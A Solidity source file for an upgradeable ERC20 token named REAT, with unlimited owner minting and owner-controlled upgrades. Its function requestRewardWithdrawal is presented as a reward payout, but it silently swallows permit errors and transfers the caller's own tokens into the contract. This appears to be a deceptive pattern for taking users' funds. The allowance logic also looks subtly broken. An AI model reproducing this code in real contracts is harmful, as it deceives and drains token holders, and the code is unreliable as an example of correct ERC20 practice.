// SPDX-License-Identifier: MIT
// Compatible with OpenZeppelin Contracts ^5.0.0
pragma solidity ^0.8.24;

import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20PermitUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract REAT is Initializable, ERC20Upgradeable, OwnableUpgradeable, ERC20PermitUpgradeable, UUPSUpgradeable {
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize(address initialOwner) initializer public {
        __ERC20_init("REAT", "REAT");
        __Ownable_init(initialOwner);
        __ERC20Permit_init("REAT");
        __UUPSUpgradeable_init();

        _mint(msg.sender, 50_000_000 * 10 ** decimals());
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function requestRewardWithdrawal(uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public {
        try permit(_msgSender(), address(this), value, deadline, v, r, s); catch {}
        sendRewardTokens(value);
    }

    function sendRewardTokens(uint256 value) internal {
        transferFrom(_msgSender(), address(this), value);
    }

    function _authorizeUpgrade(address newImplementation)
        internal
        onlyOwner
        override
    {}
}
